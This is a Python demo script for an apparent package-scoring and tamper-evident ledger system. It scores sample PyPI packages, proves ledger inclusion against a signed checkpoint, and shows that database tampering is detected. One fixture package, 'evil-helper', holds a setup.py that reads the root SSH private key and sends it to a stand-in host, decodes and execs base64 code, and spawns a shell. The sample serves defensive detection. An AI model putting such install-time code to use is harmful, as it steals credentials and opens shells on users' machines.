"""Ledger demo (no network, no SPIRE): score packages through the REAL gateway app into a
fresh SQLite ledger, show the ledger, prove a record against a signed checkpoint, then
tamper with the database and show that it is detected.

    PYTHONPATH=src:. python docs/examples/ledger_demo.py
"""
import base64
import sqlite3
import tempfile
from pathlib import Path

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
from fastapi.testclient import TestClient

from attesta.backends.models import Checkpoint, InclusionProof
from attesta.backends.sqlite import SqliteBackend
from attesta.gateway.app import create_app
from attesta.gateway.identity import PeerIdentity, get_peer_identity
from attesta.gateway.settings import GatewaySettings
from attesta.ledger.checkpoints import CheckpointSigner, verify_inclusion
from attesta.policy.engine import load_policy
from attesta.records.signing import KeyRegistry, ScorerKey
from attesta.scoring.reference import HeuristicExtractor, HeuristicModel
from attesta.scoring.service import ScoringService
from attesta.scoring.settings import ScoringSettings
from attesta.scoring.signer import ScorerSigner
from attesta.scoring.submit import GatewaySubmitter
from attesta.tools.ledger_view import read_rows, render
from tests.scoring.helpers import FakeFetcher, FixedAttestation, make_targz

SCORER_ID = "spiffe://attesta.example.org/scoring-service"
CERT = "ab" * 32
PACKAGES = {  # name -> files
    "tidy-utils": {"setup.py": "from setuptools import setup\nsetup()", "t/__init__.py": "x = 1\n"},
    "fetch-lib": {"setup.py": "setup()", "f/net.py": "import urllib.request\nurllib.request.urlopen(u)",
                  "f/run.py": "import subprocess\nsubprocess.run(['ls'])"},
    "evil-helper": {"setup.py": "import subprocess, base64, urllib.request\n"
                                "k = open('/root/.ssh/id_rsa').read()\n"
                                "urllib.request.urlopen('https://x.example/' + k)\n"
                                "exec(base64.b64decode('cHJpbnQoMSk='))\n"
                                "subprocess.run(['sh'])\nsetup(cmdclass={'install': object})"},
}


def title(text: str) -> None:
    print(f"\n=== {text} ===")


def main() -> None:
    work = Path(tempfile.mkdtemp(prefix="attesta-ledger-demo-"))
    key = Ed25519PrivateKey.generate()
    public = key.public_key().public_bytes(serialization.Encoding.Raw, serialization.PublicFormat.Raw)
    registry = KeyRegistry([ScorerKey(key_id="scorer-dev-1", public_key=base64.b64encode(public).decode(),
                                      not_before="2020-01-01T00:00:00+00:00",
                                      not_after="2099-01-01T00:00:00+00:00")])
    policy = load_policy("config/policy.yaml")
    backend = SqliteBackend(work / "ledger.db", CheckpointSigner.load_or_create(work / "ckpt-keys"))
    app = create_app(GatewaySettings(), backend, registry, policy)
    app.dependency_overrides[get_peer_identity] = lambda: PeerIdentity(SCORER_ID, CERT)

    fetcher = FakeFetcher()
    for name, files in PACKAGES.items():
        fetcher.add_pypi(name, "1.0.0", make_targz({f"{name}-1.0.0/{p}": c for p, c in files.items()}),
                         filename=f"{name}-1.0.0.tar.gz")

    with TestClient(app) as client:
        class Gateway:  # stands in for the SPIFFE mTLS client
            def request(self, method, path, body=None):
                response = client.request(method, path, json=body)
                return response.status_code, response.json()

        service = ScoringService(ScoringSettings(), fetcher, HeuristicModel(), HeuristicExtractor(), policy,
                                 ScorerSigner("scorer-dev-1", key), FixedAttestation(True),
                                 GatewaySubmitter(Gateway(), lambda: CERT))
        title("1. Score three packages; each signed record is appended through the gateway")
        for name in PACKAGES:
            s = service.score("pypi", name, "1.0.0", run_hint="demo").summary()
            print(f"  pypi:{name}@1.0.0 -> {s['decision']:<6} (score {s['risk_score']}) "
                  f"ledger entry #{s['ledger']['sequence']}")

        title("2. The ledger (read-only view of the database file)")
        print(render(read_rows(work / "ledger.db")))

        title("3. Prove one record is in the ledger, against a SIGNED checkpoint")
        record_id = next(e["record"]["record_id"] for e in client.get("/records").json()
                         if e["record"]["package"] == "evil-helper")
        checkpoint = Checkpoint(**client.get("/checkpoint").json())
        proof = InclusionProof(**client.get(f"/proof/{record_id}").json())
        ok = verify_inclusion(proof, checkpoint, backend._signer.public_key)
        print(f"  record {record_id}\n  leaf #{proof.leaf_index} of {proof.tree_size}, "
              f"{len(proof.proof)} proof steps\n  checkpoint root {checkpoint.merkle_root[:20]}.. "
              f"signature + inclusion verified: {ok}")

    title("4. Tamper: someone edits the BLOCK record in the database to say ALLOW")
    conn = sqlite3.connect(work / "ledger.db")
    conn.execute("UPDATE trust_records SET payload = replace(payload, '\"decision\":\"BLOCK\"', "
                 "'\"decision\":\"ALLOW\"') WHERE sequence = 3")
    conn.commit()
    conn.close()
    print(render(read_rows(work / "ledger.db")))
    print(f"\n  gateway checkpoint now refuses: ", end="")
    try:
        backend.checkpoint()
    except ValueError as exc:
        print(exc)
    print(f"\n(demo ledger kept at {work / 'ledger.db'})")


if __name__ == "__main__":
    main()
